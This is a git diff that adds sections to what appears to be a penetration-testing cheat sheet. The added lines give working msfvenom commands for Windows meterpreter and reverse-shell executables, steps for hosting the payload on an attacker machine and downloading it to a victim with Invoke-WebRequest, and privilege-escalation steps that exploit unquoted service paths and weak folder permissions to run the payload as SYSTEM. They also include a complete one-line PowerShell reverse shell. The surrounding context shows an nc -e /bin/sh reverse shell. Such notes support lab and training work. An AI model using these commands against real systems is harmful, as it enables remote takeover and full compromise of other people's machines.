@@ -56,6 +56,56 @@ Lists the processes that are being launched in real time, including processes ow
 # Check mysql history for login details - cat .mysql_history'
 
  ```
+### Upgrade meterpreter shell Windows
+```
+1. Create a windows TCP reverse shell payload executable
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.49 LPORT=4446 -e x86/shikata_ga_nai -f exe -o reverse.exe
+OR
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.5 LPORT=4444 -f exe > reverse.exe
+
+2. Host the payload on a server from our kali machine (in order to download it from the vul-
+nerable machine)
+
+python -m http.server 8000 
+
+3. Download the payload to the vulnerable machine using our powershell reverse shell use format Invoke-WebRequest -Uri "http://192.168.56.49:8000/reverse.exe" -Outfile "reverse.exe"
+Invoke-WebRequest http://10.8.0.5:8000/reverse.exe -outfile .\reverse.exe
+-NOTE! may have to do this in public directory as its executable
+
+4. Create another netcat listener on our kali machine
+5. Execute the new reverse shell payload and capture the shell
+./reverse.exe
+```
+### Reveal vulnerable services on Windows System
+https://medium.com/@dasagreeva/windows-priv-
+ilege-escalation-methods-2e93c954a287
+1. Unquoted Service Paths
+```wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """```
+Look for listed unquoted executable paths 
+Vulnerable Service Vulnerable Service C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe Auto
+If we drop malicious code to one of these paths, windows will run our exe as system upon restart of service
+
+Check for permissions of folders
+```icacls “C:\Program Files (x86)\Program Folder”```
+F = Full Control
+Can now place a payload into the folder and start of the service it will run as SYSTEM
+
+Place payloads across windows folders
+```copy C:\Users\Public\reverse.exe ‘C:\Program Files (x86)\IObit\reverse.exe’```
+```Rename-Item reverse.exe Advanced.exe```
+
+To restart and stop services USE
+```sc stop ServiceName```
+```sc start ServiceName```
+
+2. Insecure File/Folder Permissions
+   Check permissions for vulnerable service executable path
+```icacls “C:\Program Files (x86)\Program Folder\A Subfolder”```
+Replace executable.exe with a reverse shell payload and restarting the service
+```
+
+
+ 
 
 
 
@@ -69,7 +119,7 @@ Lists the processes that are being launched in real time, including processes ow
 ## Payloads
 
 #Payload Links
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config
+```https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config```
 
 ### Low Privilege Reverse Shell
 ```
@@ -82,6 +132,12 @@ nc -e /bin/sh 192.168.x.x 4444
 ```
 ### PHP Reverse Shell
 https://github.com/pentestmonkey/php-reverse-shell
+
+### Reverse powershell 
+https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
+```
+$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
 
 
 ## Password Cracking
